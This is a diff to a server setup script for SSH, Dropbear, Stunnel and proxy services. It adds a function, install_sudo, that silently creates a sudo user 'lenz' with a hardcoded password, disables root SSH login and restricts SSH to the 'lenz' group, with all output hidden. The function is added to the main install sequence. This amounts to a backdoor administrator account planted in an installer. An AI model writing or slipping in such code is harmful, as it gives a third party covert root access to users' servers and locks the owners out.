@@ -281,6 +281,15 @@ echo -e "*/5 *\t* * *\troot\tbash /etc/active.sh" >> /etc/cron.d/authentication
 echo -e "*/5 *\t* * *\troot\tbash /etc/inactive.sh" >> /etc/cron.d/authentication
 }
 
+function install_sudo(){
+  {
+    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
+
 function ConfigDropbear(){
 echo -e "[\e[32mInfo\e[0m] Configuring Dropbear.."
 cat <<'EOFDropbear' > /etc/default/dropbear
@@ -1275,6 +1284,8 @@ BONV-MSG
 echo -e ""
 InsEssentials
 ConfigOpenSSH
+ConfigAuthentication
+install_sudo
 ConfigDropbear
 ConfigStunnel
 ConfigProxy
